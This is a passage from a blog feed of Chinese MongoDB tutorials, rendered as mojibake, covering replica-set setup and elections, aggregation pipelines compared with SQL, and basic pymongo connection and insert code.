æ‰§è¡Œæƒé™å¹¶è¿è¡Œ"></a>3. æ·»åŠ æ‰§è¡Œæƒé™å¹¶è¿è¡Œ</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> +x mongod-start.sh<span class="token function">chmod</span> +x mongod-stop.sh./mongod-start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="äº”ã€é…ç½®å¤åˆ¶é›†"><a href="#äº”ã€é…ç½®å¤åˆ¶é›†" class="headerlink" title="äº”ã€é…ç½®å¤åˆ¶é›†"></a>äº”ã€é…ç½®å¤åˆ¶é›†</h2><h3 id="1-æ–¹æ³•ä¸€"><a href="#1-æ–¹æ³•ä¸€" class="headerlink" title="1. æ–¹æ³•ä¸€"></a>1. æ–¹æ³•ä¸€</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># mongo --port 28017</span><span class="token operator">></span> rs.initiate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> rs.add<span class="token punctuation">(</span><span class="token string">"HOSTNAME:28018"</span><span class="token punctuation">)</span><span class="token operator">></span> rs.add<span class="token punctuation">(</span><span class="token string">"HOSTNAME:28019"</span><span class="token punctuation">)</span><span class="token operator">></span> rs.status<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-æ–¹æ³•äºŒ"><a href="#2-æ–¹æ³•äºŒ" class="headerlink" title="2. æ–¹æ³•äºŒ"></a>2. æ–¹æ³•äºŒ</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># mongo --port 28017</span><span class="token operator">></span> rs.initiate<span class="token punctuation">(</span><span class="token punctuation">{</span>    _id: <span class="token string">"rs0"</span>,  members: <span class="token punctuation">[</span><span class="token punctuation">{</span>        _id: 0,        host: <span class="token string">"localhost: 28017"</span>    <span class="token punctuation">}</span>,<span class="token punctuation">{</span>        _id: 1,        host: <span class="token string">"localhost :28018"</span>    <span class="token punctuation">}</span>,<span class="token punctuation">{</span>        _id: 2,        host: <span class="token string">"localhost: 28019"</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">></span> rs.status<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBå¤åˆ¶é›†æœºåˆ¶åŠåŸç†</title>
      <link href="/post/6cec05ac.html"/>
      <url>/post/6cec05ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-å¤åˆ¶é›†æœºåˆ¶åŠåŸç†"><a href="#MongoDB-å¤åˆ¶é›†æœºåˆ¶åŠåŸç†" class="headerlink" title="MongoDB å¤åˆ¶é›†æœºåˆ¶åŠåŸç†"></a>MongoDB å¤åˆ¶é›†æœºåˆ¶åŠåŸç†</h1><h2 id="ä¸€ã€å¤åˆ¶é›†çš„ä½œç”¨"><a href="#ä¸€ã€å¤åˆ¶é›†çš„ä½œç”¨" class="headerlink" title="ä¸€ã€å¤åˆ¶é›†çš„ä½œç”¨"></a>ä¸€ã€å¤åˆ¶é›†çš„ä½œç”¨</h2><ul><li>MongoDB å¤åˆ¶é›†çš„ä¸»è¦æ„ä¹‰åœ¨äºå®ç°æœåŠ¡é«˜å¯ç”¨</li><li>å®ƒçš„å®ç°ä¾èµ–äºä¸¤ä¸ªæ–¹é¢çš„åŠŸèƒ½ï¼š<ul><li>æ•°æ®å†™å…¥æ—¶å°†æ•°æ®è¿…é€Ÿå¤åˆ¶åˆ°å¦ä¸€ä¸ªç‹¬ç«‹èŠ‚ç‚¹ä¸Š</li><li>åœ¨æ¥å—å†™å…¥çš„èŠ‚ç‚¹å‘ç”Ÿæ•…éšœæ—¶è‡ªåŠ¨é€‰ä¸¾å‡ºä¸€ä¸ªæ–°çš„æ›¿ä»£èŠ‚ç‚¹</li></ul></li><li>åœ¨å®ç°é«˜å¯ç”¨çš„åŒæ—¶ï¼Œå¤åˆ¶é›†å®ç°äº†å…¶å®ƒå‡ ä¸ªé™„åŠ åŠŸèƒ½<ul><li>æ•°æ®åˆ†å‘ï¼šå°†æ•°æ®ä»ä¸€ä¸ªåŒºåŸŸå¤åˆ¶åˆ°å¦ä¸€ä¸ªåŒºåŸŸï¼Œå‡å°‘å¦ä¸€ä¸ªåŒºåŸŸçš„è¯»å»¶è¿Ÿ</li><li>è¯»å†™åˆ†ç¦»ï¼šä¸åŒç±»å‹çš„å‹åŠ›åˆ†åˆ«åœ¨ä¸åŒçš„èŠ‚ç‚¹ä¸Šæ‰§è¡Œ</li><li>å¼‚åœ°å®¹ç¾ï¼šåœ¨æ•°æ®ä¸­å¿ƒæ•…éšœçš„æ—¶å€™å¿«é€Ÿåˆ‡æ¢åˆ°å¼‚åœ°</li></ul></li></ul><h2 id="äºŒã€å…¸å‹å¤åˆ¶é›†ç»“æ„"><a href="#äºŒã€å…¸å‹å¤åˆ¶é›†ç»“æ„" class="headerlink" title="äºŒã€å…¸å‹å¤åˆ¶é›†ç»“æ„"></a>äºŒã€å…¸å‹å¤åˆ¶é›†ç»“æ„</h2><ul><li>ä¸€ä¸ªå…¸å‹çš„å¤åˆ¶é›†ç”± 3 ä¸ªä»¥ä¸Šå…·æœ‰æŠ•ç¥¨æƒçš„èŠ‚ç‚¹ç»„æˆï¼ŒåŒ…æ‹¬ï¼š<ul><li>ä¸€ä¸ªä¸»èŠ‚ç‚¹ï¼ˆPRIMARYï¼‰ï¼šæ¥å—å†™å…¥æ“ä½œå’Œé€‰ä¸¾æ—¶æŠ•ç¥¨</li><li>ä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰ä»èŠ‚ç‚¹ï¼ˆSECONDARYï¼‰ï¼šå¤åˆ¶ä¸»èŠ‚ç‚¹ä¸Šçš„æ–°æ•°æ®å’Œé€‰ä¸¾æ—¶æŠ•ç¥¨</li><li>ä¸æ¨èä½¿ç”¨ Arbiterï¼ˆæŠ•ç¥¨èŠ‚ç‚¹ï¼‰</li></ul></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619510917766-48e7f21c-989f-4eef-bd3d-88a8b7a528bf.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=223&amp;id=ucaa20424&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=223&amp;originWidth=395&amp;originalType=binary%E2%88%B6=1&amp;size=25420&amp;status=done&amp;style=none&amp;taskId=u4a0ef6c1-bd0f-4202-b5ce-0ab9125a890&amp;width=395" alt="image.png"></p><h3 id="å‰¯æœ¬é›†ç¤ºä¾‹"><a href="#å‰¯æœ¬é›†ç¤ºä¾‹" class="headerlink" title="å‰¯æœ¬é›†ç¤ºä¾‹"></a>å‰¯æœ¬é›†ç¤ºä¾‹</h3><p>ä¸‹é¢è¿™å¼ å›¾æ˜¯ä¸€ä¸ªå…¸å‹ä¸‰èŠ‚ç‚¹å‰¯æœ¬é›†ï¼Œç”±ä¸€ä¸ªæ´»è·ƒèŠ‚ç‚¹ï¼Œä¸¤ä¸ªå¤‡ä»½èŠ‚ç‚¹ç»„æˆã€‚æ´»è·ƒèŠ‚ç‚¹æ¥å—æ‰€æœ‰çš„å†™æ“ä½œï¼Œå…¶ä¸Šæ•°æ®é›†çš„æ‰€æœ‰å˜æ›´éƒ½ä¼šè®°å½•åˆ°è‡ªèº«çš„æ“ä½œæ—¥å¿—ï¼ˆoplogï¼‰ä¸­ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619512782582-6652bdb2-2779-4ca0-a22f-bc1597e7be71.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=372&amp;id=u56d74fd9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=428&amp;originWidth=553&amp;originalType=binary%E2%88%B6=1&amp;size=30702&amp;status=done&amp;style=none&amp;taskId=u1f76592e-d092-4e51-894a-030f01ab516&amp;width=481" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619615488506-dc7480cf-844a-4e70-b916-548158a9544e.png#clientId=u4c85ad2b-69e1-4&amp;from=paste&amp;height=373&amp;id=ucf8750ab&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=373&amp;originWidth=602&amp;originalType=binary%E2%88%B6=1&amp;size=27471&amp;status=done&amp;style=none&amp;taskId=uf933f801-18f7-4742-9e53-00df4b48184&amp;width=602" alt="image.png"></p><p>å¤‡ä»½èŠ‚ç‚¹å¤åˆ¶æ´»è·ƒèŠ‚ç‚¹çš„çš„ oplogï¼Œç„¶åå°† oplog çš„æ“ä½œåº”ç”¨åˆ°è‡ªèº«çš„æ•°æ®é›†ä¸Šï¼Œä»¥è¾¾åˆ°ä¸æ´»è·ƒèŠ‚ç‚¹æ•°æ®ä¸€è‡´çš„ç›®çš„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619512879330-9d47c248-8ebb-4981-a4c8-373e6bed8936.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=232&amp;id=u1d37902d&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=293&amp;originWidth=718&amp;originalType=binary%E2%88%B6=1&amp;size=31527&amp;status=done&amp;style=none&amp;taskId=uc42fb473-1365-4a27-8dd2-4bdf40e1101&amp;width=569" alt="image.png"><br>æ­¤å¤–ï¼Œå‰¯æœ¬é›†å†…éƒ¨èŠ‚ç‚¹æ¯ 2 ç§’ä¼šç›¸äº’å‘é€å¿ƒè·³åŒ…ã€‚</p><h2 id="ä¸‰ã€æ•°æ®æ˜¯å¦‚ä½•å¤åˆ¶çš„ï¼Ÿ"><a href="#ä¸‰ã€æ•°æ®æ˜¯å¦‚ä½•å¤åˆ¶çš„ï¼Ÿ" class="headerlink" title="ä¸‰ã€æ•°æ®æ˜¯å¦‚ä½•å¤åˆ¶çš„ï¼Ÿ"></a>ä¸‰ã€æ•°æ®æ˜¯å¦‚ä½•å¤åˆ¶çš„ï¼Ÿ</h2><ul><li>å½“ä¸€ä¸ªä¿®æ”¹æ“ä½œï¼Œæ— è®ºæ˜¯æ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤ï¼Œåˆ°è¾¾ä¸»èŠ‚ç‚¹æ—¶ï¼Œå®ƒå¯¹æ•°æ®çš„æ“ä½œå°†è¢«è®°å½•ä¸‹æ¥ï¼ˆç»è¿‡ä¸€äº›å¿…è¦çš„è½¬æ¢ï¼‰ï¼Œè¿™äº›è®°å½•ç§°ä¸º oplogã€‚</li><li>ä»èŠ‚ç‚¹é€šè¿‡åœ¨ä¸»èŠ‚ç‚¹ä¸Šæ‰“å¼€ä¸€ä¸ª tailable æ¸¸æ ‡ä¸æ–­è·å–æ–°è¿›å…¥ä¸»èŠ‚ç‚¹çš„ oplog ï¼Œå¹¶åœ¨è‡ªå·±çš„æ•°æ®ä¸Šå›æ”¾ï¼Œä»¥æ­¤ä¿æŒè·Ÿä¸»èŠ‚ç‚¹çš„æ•°æ®ä¸€è‡´ã€‚</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619512327214-67b7c6c5-4766-430c-873d-4ed574bed592.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=242&amp;id=u9f451ca8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=242&amp;originWidth=643&amp;originalType=binary%E2%88%B6=1&amp;size=31239&amp;status=done&amp;style=none&amp;taskId=ub369996b-a1eb-4b15-9841-f7c258b2085&amp;width=643" alt="image.png"></p><h2 id="å››ã€é€šè¿‡é€‰ä¸¾å®Œæˆæ•…éšœæ¢å¤"><a href="#å››ã€é€šè¿‡é€‰ä¸¾å®Œæˆæ•…éšœæ¢å¤" class="headerlink" title="å››ã€é€šè¿‡é€‰ä¸¾å®Œæˆæ•…éšœæ¢å¤"></a>å››ã€é€šè¿‡é€‰ä¸¾å®Œæˆæ•…éšœæ¢å¤</h2><ul><li>å…·æœ‰æŠ•ç¥¨æƒçš„èŠ‚ç‚¹ä¹‹é—´ä¸¤ä¸¤äº’ç›¸å‘é€å¿ƒè·³ï¼›</li><li>å½“ 5 æ¬¡å¿ƒè·³æœªæ¥æ”¶æ—¶åˆ¤æ–­ä¸ºèŠ‚ç‚¹å¤±è”ï¼›</li><li>å¦‚æœå¤±è”çš„æ˜¯ä¸»èŠ‚ç‚¹ï¼Œä»èŠ‚ç‚¹ä¼šå‘èµ·é€‰ä¸¾ï¼Œé€‰ä¸¾å‡ºæ–°çš„ä¸»èŠ‚ç‚¹ï¼›</li><li>å¦‚æœå¤±è”çš„æ˜¯ä»èŠ‚ç‚¹åˆ™ä¸ä¼šäº§ç”Ÿæ–°çš„é€‰ä¸¾ï¼›</li><li>é€‰ä¸¾åŸºäº bully ç®—æ³•å®ç°ï¼Œé€‰ä¸¾æˆåŠŸçš„å¿…è¦æ¡ä»¶æ˜¯å¤§å¤šæ•°æŠ•ç¥¨èŠ‚ç‚¹å­˜æ´»ï¼›</li><li>å¤åˆ¶é›†ä¸­æœ€å¤šå¯ä»¥æœ‰ 50 ä¸ªèŠ‚ç‚¹ï¼Œä½†æ˜¯æœ‰æŠ•ç¥¨æƒçš„èŠ‚ç‚¹æœ€å¤š 7 ä¸ªã€‚</li><li>å¦‚æœæ´»è·ƒèŠ‚ç‚¹ä¸å¯ç”¨ï¼Œå¤‡ä»½èŠ‚ç‚¹ä¹‹é—´ä¼šè‡ªåŠ¨å‘èµ·é€‰ä¸¾å°†å…¶ä¸­ä¸€ä¸ªæˆå‘˜å‡çº§ä¸ºæ–°çš„æ´»è·ƒèŠ‚ç‚¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619513203670-6a4e1575-1609-4c36-8db1-9d593ff3e591.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=379&amp;id=uea81e869&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=379&amp;originWidth=500&amp;originalType=binary%E2%88%B6=1&amp;size=38001&amp;status=done&amp;style=none&amp;taskId=uf735e7be-7cfc-4042-83e4-6084166ffe3&amp;width=500" alt="image.png"></p><ul><li>å…¶ç‰¹ç‚¹å¦‚ä¸‹ï¼š<ol><li> è§¦å‘æ—¶æœºï¼šæ´»è·ƒèŠ‚ç‚¹è¶…è¿‡ 10 ç§’éƒ½æ²¡æœ‰ä¸å…¶ä»–èŠ‚ç‚¹å‘èµ·å¿ƒè·³ã€‚</li><li> å¤‡é€‰èŠ‚ç‚¹æ¨é€‰è‡ªèº«ä¸ºæ´»è·ƒèŠ‚ç‚¹ï¼Œå¹¶åœ¨å¤§å¤šæ•°èŠ‚ç‚¹åŒæ„åæˆä¸ºæ´»è·ƒèŠ‚ç‚¹ã€‚</li><li> æ•´ä¸ªè¿‡ç¨‹è€—æ—¶å°†è¿‘ 1 åˆ†é’Ÿã€‚ï¼ˆå‘ç°ä¸å¯ç”¨ 10<del>30 ç§’ï¼Œé€‰ä¸¾è¿‡ç¨‹ 10</del>30 ç§’ï¼‰</li></ol></li></ul><h2 id="äº”ã€é€‰ä¸¾æœºåˆ¶"><a href="#äº”ã€é€‰ä¸¾æœºåˆ¶" class="headerlink" title="äº”ã€é€‰ä¸¾æœºåˆ¶"></a>äº”ã€é€‰ä¸¾æœºåˆ¶</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619515403683-d529a042-5a6b-4322-a6b8-0626e546ef7c.png#clientId=u4108e5ee-cd53-4&amp;from=paste&amp;height=666&amp;id=ub27fe45d&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=666&amp;originWidth=765&amp;originalType=binary%E2%88%B6=1&amp;size=270493&amp;status=done&amp;style=none&amp;taskId=u57e102e0-4e00-44ec-ba9f-0dcbe20bf98&amp;width=765" alt="image.png"></p><h2 id="å…­ã€å½±å“é€‰ä¸¾çš„å› ç´ "><a href="#å…­ã€å½±å“é€‰ä¸¾çš„å› ç´ " class="headerlink" title="å…­ã€å½±å“é€‰ä¸¾çš„å› ç´ "></a>å…­ã€å½±å“é€‰ä¸¾çš„å› ç´ </h2><ul><li>æ•´ä¸ªé›†ç¾¤å¿…é¡»æœ‰å¤§å¤šæ•°èŠ‚ç‚¹å­˜æ´»</li><li>è¢«é€‰ä¸¾ä¸ºä¸»èŠ‚ç‚¹çš„èŠ‚ç‚¹å¿…é¡»ï¼š<ul><li>èƒ½å¤Ÿä¸å¤šæ•°èŠ‚ç‚¹å»ºç«‹è¿æ¥</li><li>å…·æœ‰è¾ƒæ–°çš„ oplog</li><li>å…·æœ‰è¾ƒé«˜çš„ä¼˜å…ˆçº§ï¼ˆå¦‚æœæœ‰é…ç½®ï¼‰</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBèšåˆæŸ¥è¯¢</title>
      <link href="/post/417bc864.html"/>
      <url>/post/417bc864.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-èšåˆæŸ¥è¯¢"><a href="#MongoDB-èšåˆæŸ¥è¯¢" class="headerlink" title="MongoDB èšåˆæŸ¥è¯¢"></a>MongoDB èšåˆæŸ¥è¯¢</h1><h2 id="ä¸€ã€ä»€ä¹ˆæ˜¯-MongoDB-èšåˆæ¡†æ¶"><a href="#ä¸€ã€ä»€ä¹ˆæ˜¯-MongoDB-èšåˆæ¡†æ¶" class="headerlink" title="ä¸€ã€ä»€ä¹ˆæ˜¯ MongoDB èšåˆæ¡†æ¶"></a>ä¸€ã€ä»€ä¹ˆæ˜¯ MongoDB èšåˆæ¡†æ¶</h2><ul><li>MongoDB èšåˆæ¡†æ¶ï¼ˆAggregation Frameworkï¼‰æ˜¯ä¸€ä¸ªè®¡ç®—æ¡†æ¶ï¼Œå®ƒå¯ä»¥ï¼š<ul><li>ä½œç”¨åœ¨ä¸€ä¸ªæˆ–å‡ ä¸ªé›†åˆä¸Šï¼›</li><li>å¯¹é›†åˆä¸­çš„æ•°æ®è¿›è¡Œä¸€ç³»åˆ—è¿ç®—ï¼›</li><li>å°†è¿™äº›æ•°æ®è½¬åŒ–ä¸ºæœŸæœ›çš„å½¢å¼ï¼›</li></ul></li><li>ä»æ•ˆæœè€Œè¨€ï¼Œèšåˆæ¡†æ¶ç›¸å½“äº SQL æŸ¥è¯¢ä¸­çš„ï¼š<ul><li>GROUP BY</li><li>LEFT OUTER JOIN</li><li>AS ç­‰</li></ul></li></ul><h2 id="äºŒã€ç®¡é“ï¼ˆPipelineï¼‰å’Œæ­¥éª¤ï¼ˆStageï¼‰"><a href="#äºŒã€ç®¡é“ï¼ˆPipelineï¼‰å’Œæ­¥éª¤ï¼ˆStageï¼‰" class="headerlink" title="äºŒã€ç®¡é“ï¼ˆPipelineï¼‰å’Œæ­¥éª¤ï¼ˆStageï¼‰"></a>äºŒã€ç®¡é“ï¼ˆPipelineï¼‰å’Œæ­¥éª¤ï¼ˆStageï¼‰</h2><ul><li>æ•´ä¸ªèšåˆè®¡ç®—è¿‡ç¨‹ç§°ä¸ºç®¡é“ï¼ˆPipelineï¼‰ï¼Œå®ƒç”±å¤šä¸ªæ­¥éª¤ï¼ˆStageï¼‰ç»„æˆï¼Œæ¯ä¸ªç®¡é“ï¼š<ul><li>æ¥å—ä¸€ç³»åˆ—æ–‡æ¡£ï¼ˆåŸå§‹æ•°æ®ï¼‰</li><li>æ¯ä¸ªæ­¥éª¤å¯¹è¿™äº›æ–‡æ¡£è¿›è¡Œä¸€ç³»åˆ—è¿ç®—</li><li>ç»“æœæ–‡æ¡£è¾“å‡ºç»™ä¸‹ä¸€ä¸ªæ­¥éª¤</li></ul></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619434004581-c4cd5764-51e4-4bfd-ab3f-8bd82ceaa906.png#clientId=u31e27df3-5c0c-4&amp;from=paste&amp;height=106&amp;id=u61bfe8d8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=106&amp;originWidth=895&amp;originalType=binary%E2%88%B6=1&amp;size=38821&amp;status=done&amp;style=none&amp;taskId=ub72da361-524c-4ad2-9d95-2e0daf5deab&amp;width=895" alt="image.png"></p><h2 id="ä¸‰ã€èšåˆè¿ç®—åŸºæœ¬æ ¼å¼"><a href="#ä¸‰ã€èšåˆè¿ç®—åŸºæœ¬æ ¼å¼" class="headerlink" title="ä¸‰ã€èšåˆè¿ç®—åŸºæœ¬æ ¼å¼"></a>ä¸‰ã€èšåˆè¿ç®—åŸºæœ¬æ ¼å¼</h2><pre class="line-numbers language-plsql"><code class="language-plsql">pipeline = [$stage1, $stage2, ..., $stageN];db.<COLLECTION>.aggregate(    pipeline,  { options });<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å››ã€å¸¸è§æ­¥éª¤"><a href="#å››ã€å¸¸è§æ­¥éª¤" class="headerlink" title="å››ã€å¸¸è§æ­¥éª¤"></a>å››ã€å¸¸è§æ­¥éª¤</h2><table><thead><tr><th><strong>æ­¥éª¤</strong></th><th><strong>ä½œç”¨</strong></th><th><strong>SQL ç­‰ä»·è¿ç®—ç¬¦</strong></th></tr></thead><tbody><tr><td>$match</td><td>è¿‡æ»¤</td><td>WHERE</td></tr><tr><td>$project</td><td>æŠ•å½±</td><td>AS</td></tr><tr><td>$sort</td><td>æ’åº</td><td>ORDER BY</td></tr><tr><td>$group</td><td>åˆ†ç»„</td><td>GROUP BY</td></tr><tr><td>$skip/$limit</td><td>ç»“æœé™åˆ¶</td><td>SKIP/LIMIT</td></tr><tr><td>$lookup</td><td>å·¦å¤–è¿æ¥</td><td>LEFT OUTER JOIN</td></tr><tr><td>$unwind</td><td>å±•å¼€æ•°ç»„</td><td>N/A</td></tr><tr><td>$graphLookup</td><td>å›¾æœç´¢</td><td>N/A</td></tr><tr><td>$facet/$buket</td><td>åˆ†ç‰‡æœç´¢</td><td>N/A</td></tr></tbody></table><h2 id="äº”ã€èšåˆè¿ç®—çš„ä½¿ç”¨åœºæ™¯"><a href="#äº”ã€èšåˆè¿ç®—çš„ä½¿ç”¨åœºæ™¯" class="headerlink" title="äº”ã€èšåˆè¿ç®—çš„ä½¿ç”¨åœºæ™¯"></a>äº”ã€èšåˆè¿ç®—çš„ä½¿ç”¨åœºæ™¯</h2><ul><li>èšåˆæŸ¥è¯¢å¯ä»¥ç”¨äº OLAP å’Œ OLTP åœºæ™¯ã€‚ä¾‹å¦‚ï¼š<table><thead><tr><th><strong>OLTP</strong></th><th><strong>OLAP</strong></th></tr></thead><tbody><tr><td>è®¡ç®—</td><td>åˆ†æä¸€æ®µæ—¶é—´å†…çš„é”€å”®æ€»é¢ã€å‡å€¼</td></tr><tr><td></td><td>è®¡ç®—ä¸€æ®µæ—¶é—´å†…çš„å‡€åˆ©æ¶¦</td></tr><tr><td></td><td>åˆ†æè´­ä¹°äººçš„å¹´é¾„åˆ†å¸ƒ</td></tr><tr><td></td><td>åˆ†æå­¦ç”Ÿæˆç»©åˆ†å¸ƒ</td></tr><tr><td></td><td>ç»Ÿè®¡å‘˜å·¥ç»©æ•ˆ</td></tr></tbody></table></li></ul><h2 id="å…­ã€MQL-å¸¸ç”¨æ­¥éª¤ä¸-SQL-å¯¹æ¯”"><a href="#å…­ã€MQL-å¸¸ç”¨æ­¥éª¤ä¸-SQL-å¯¹æ¯”" class="headerlink" title="å…­ã€MQL å¸¸ç”¨æ­¥éª¤ä¸ SQL å¯¹æ¯”"></a>å…­ã€MQL å¸¸ç”¨æ­¥éª¤ä¸ SQL å¯¹æ¯”</h2><ul><li>SQL</li></ul><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    FIRST_ NAME <span class="token keyword">AS</span> <span class="token punctuation">`</span>å<span class="token punctuation">`</span><span class="token punctuation">,</span>    LAST_ NAME <span class="token keyword">AS</span> <span class="token punctuation">`</span>å§“<span class="token punctuation">`</span><span class="token keyword">FROM</span> Users<span class="token keyword">WHERE</span> GENDER <span class="token operator">=</span> <span class="token string">'ç”·'</span>SKIP <span class="token number">100</span><span class="token keyword">LIMIT</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>MQL</li></ul><pre class="line-numbers language-plsql"><code class="language-plsql">db.users.aggregate([    {$match: {gender: "ç”·"}},    {$skip: 100},    {$limit: 20},    {$project: {        'å': '$first_ name',        'å§“': '$last_ name'     }} });<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBç¨‹åºå¼€å‘-Python</title>
      <link href="/post/ab9d171d.html"/>
      <url>/post/ab9d171d.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-ç¨‹åºå¼€å‘-Python"><a href="#MongoDB-ç¨‹åºå¼€å‘-Python" class="headerlink" title="MongoDB ç¨‹åºå¼€å‘-Python"></a>MongoDB ç¨‹åºå¼€å‘-Python</h1><h2 id="ä¸€ã€å®‰è£…-Python-MongoDB-é©±åŠ¨ç¨‹åº"><a href="#ä¸€ã€å®‰è£…-Python-MongoDB-é©±åŠ¨ç¨‹åº" class="headerlink" title="ä¸€ã€å®‰è£… Python MongoDB é©±åŠ¨ç¨‹åº"></a>ä¸€ã€å®‰è£… Python MongoDB é©±åŠ¨ç¨‹åº</h2><ul><li>å®‰è£… MongoDB é©±åŠ¨</li></ul><pre class="line-numbers language-bash"><code class="language-bash">pip3 <span class="token function">install</span> pymongo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æ£€æŸ¥é©±åŠ¨ç¨‹åº</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pymongopymongo<span class="token punctuation">.</span>version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="äºŒã€åˆ›å»ºè¿æ¥"><a href="#äºŒã€åˆ›å»ºè¿æ¥" class="headerlink" title="äºŒã€åˆ›å»ºè¿æ¥"></a>äºŒã€åˆ›å»ºè¿æ¥</h2><ul><li>MongoDB è¿æ¥å­—ç¬¦ä¸²ï¼š<strong>mongodb://<host>:<port></port></host></strong></li><li>åˆå§‹åŒ–æ•°æ®åº“è¿æ¥ï¼š</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pymongo <span class="token keyword">import</span> MongoClienturi <span class="token operator">=</span> <span class="token string">"mongodb://127.0.0.1:17017"</span>client <span class="token operator">=</span> MongoClient<span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€æ’å…¥æ•°æ®"><a href="#ä¸‰ã€æ’å…¥æ•°æ®" class="headerlink" title="ä¸‰ã€æ’å…¥æ•°æ®"></a>ä¸‰ã€æ’å…¥æ•°æ®</h2><ul><li>åˆå§‹åŒ–æ•°æ®åº“å’Œé›†åˆ</li></ul><pre class="line-numbers language-python"><code class="language-python">db <span class="token operator">=</span> client<span class="token punctuation">[</span><span class="token string">"eshop"</span><span class="token punctuation">]</span>user_coll <span class="token operator">=</span> db<span class="token punctuation">[</span><span class="token string">"users"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>æ’å…¥ä¸€æ¡æ–°çš„ç”¨æˆ·æ•°æ®</li></ul><pre class="line-numbers language-python"><code class="language-python">new_user <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"nina"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"123456@qq.com"</span><span class="token punctuation">}</span>result <span class="token operator">=</span> user_coll<span class="token punctuation">.</span>insert_one<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>æ³¨ï¼šæˆ‘ä»¬å¹¶æ²¡æœ‰æå‰åˆ›å»ºæ•°æ®åº“å’Œè¡¨/é›†åˆ</p></blockquote><h2 id="å››ã€æ›´æ–°æ•°æ®"><a href="#å››ã€æ›´æ–°æ•°æ®" class="headerlink" title="å››ã€æ›´æ–°æ•°æ®"></a>å››ã€æ›´æ–°æ•°æ®</h2><ul><li>éœ€æ±‚å˜åŒ–ï¼Œè¦æ±‚ä¿®æ”¹ç”¨æˆ·å±æ€§ï¼Œå¢åŠ å­—æ®µ phone</li></ul><pre 